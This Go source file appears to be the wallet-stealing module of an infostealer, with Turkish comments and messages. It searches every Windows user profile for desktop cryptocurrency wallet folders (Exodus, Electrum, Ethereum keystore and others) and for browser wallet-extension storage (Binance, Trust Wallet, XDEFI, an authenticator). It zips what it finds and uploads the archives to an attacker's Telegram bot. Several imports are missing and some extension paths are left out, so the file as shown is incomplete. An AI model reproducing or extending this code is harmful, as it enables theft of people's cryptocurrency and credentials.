package wallets

import (
	"fmt"
	"os"
	"strings"

	"github.com/benzoXdev/oxil/modules/browsers"
	"github.com/benzoXdev/oxil/utils/fileutil"
	"github.com/benzoXdev/oxil/utils/hardware"
)

// Telegram gönderim yardımcı fonksiyonları (diğer modüllerden aynı şekilde kopyala)
func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
	}
	return nil
}

func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")

	fileWriter, err := writer.CreateFormFile("document", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}

func Run(botToken string, chatID string) {
	Local(botToken, chatID)
	Extensions(botToken, chatID)
}

func Local(botToken, chatID string) {
	users := hardware.GetUsers()
	tempDir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""

	Paths := map[string]string{
		"Zcash":        "\\Zcash",
		"Armory":       "\\Armory",
		"Bytecoin":     "\\bytecoin",
		"Jaxx":         "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
		"Exodus":       "\\Exodus\\exodus.wallet",
		"Ethereum":     "\\Ethereum\\keystore",
		"Electrum":     "\\Electrum\\wallets",
		"AtomicWallet": "\\atomic\\Local Storage\\leveldb",
		"Guarda":       "\\Guarda\\Local Storage\\leveldb",
		"Coinomi":      "\\Coinomi\\Coinomi\\wallets",
	}

	for _, user := range users {
		userPath := fmt.Sprintf("%s\\AppData\\Roaming\\", user)
		for name, path := range Paths {
			fullPath := fmt.Sprintf("%s%s", userPath, path)
			if !fileutil.IsDir(fullPath) {
				continue
			}
			dest := fmt.Sprintf("%s\\%s\\%s", tempDir, strings.Split(user, "\\")[2], name)
			if err := fileutil.Copy(fullPath, dest); err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], name)
		}
	}

	if found == "" {
		return
	}

	message := fmt.Sprintf(
		"*💰 Yerel Cüzdanlar Bulundu*\n\n"+
			"```%s```",
		found,
	)
	if len(found) > 4000 {
		message = "*💰 Yerel Cüzdanlar Bulundu*\n\nToo many wallets to list fully."
	}

	// Metni gönder
	_ = sendTextToTelegram(botToken, chatID, message)

	// ZIP oluştur ve gönder
	tempZip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
	if err := fileutil.Zip(tempDir, tempZip); err != nil {
		return
	}
	defer os.Remove(tempZip)

	caption := "Yerel cüzdan dosyaları (wallets.zip)"
	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
}

func Extensions(botToken, chatID string) {
	Paths := map[string]string{
		"Authenticator": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
		"Binance":       "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		// ... (tüm diğer extension path'leri aynı kalıyor, seninkini olduğu gibi bırak)
		"XDEFI": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"Trust Wallet": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		// sonuncuya kadar devam et
	}

	users := hardware.GetUsers()
	browsersPath := browsers.GetChromiumBrowsers()
	var profilesPaths []browsers.Profile

	// Profil yollarını toplama (eski kod aynı)
	for _, user := range users {
		for name, path := range browsersPath {
			path = fmt.Sprintf("%s\\%s", user, path)
			if !fileutil.IsDir(path) {
				continue
			}
			browser := browsers.Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}
			if browser.Name == "Opera" || browser.Name == "OperaGX" {
				profilesPaths = append(profilesPaths, browsers.Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})
				continue
			}
			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}
				profileDir := fmt.Sprintf("%s\\%s", path, profile.Name())
				files, err := os.ReadDir(profileDir)
				if err != nil {
					continue
				}
				for _, file := range files {
					if file.Name() == "Web Data" {
						profilesPaths = append(profilesPaths, browsers.Profile{
							Name:    profile.Name(),
							Path:    profileDir,
							Browser: browser,
						})
						break
					}
				}
			}
		}
	}

	if len(profilesPaths) == 0 {
		return
	}

	tempDir := fmt.Sprintf("%s\\extensions-temp", os.TempDir())
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""

	for _, profile := range profilesPaths {
		for name, path := range Paths {
			fullPath := fmt.Sprintf("%s%s", profile.Path, path)
			if !fileutil.IsDir(fullPath) {
				continue
			}
			dest := fmt.Sprintf("%s\\%s\\%s", tempDir, profile.Browser.User, name)
			if err := fileutil.Copy(fullPath, dest); err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s", profile.Browser.User, name)
		}
	}

	if found == "" {
		return
	}

	message := fmt.Sprintf(
		"*🧩 Tarayıcı Extension Cüzdanları*\n\n"+
			"```%s```",
		found,
	)
	if len(found) > 4000 {
		message = "*🧩 Tarayıcı Extension Cüzdanları*\n\nToo many extensions to list fully."
	}

	// Metni gönder
	_ = sendTextToTelegram(botToken, chatID, message)

	// ZIP oluştur ve gönder
	tempZip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
	if err := fileutil.Zip(tempDir, tempZip); err != nil {
		return
	}
	defer os.Remove(tempZip)

	caption := "Tarayıcı extension cüzdan dosyaları (extensions.zip)"
	_ = sendZipToTelegram(botToken, chatID, caption, tempZip)
}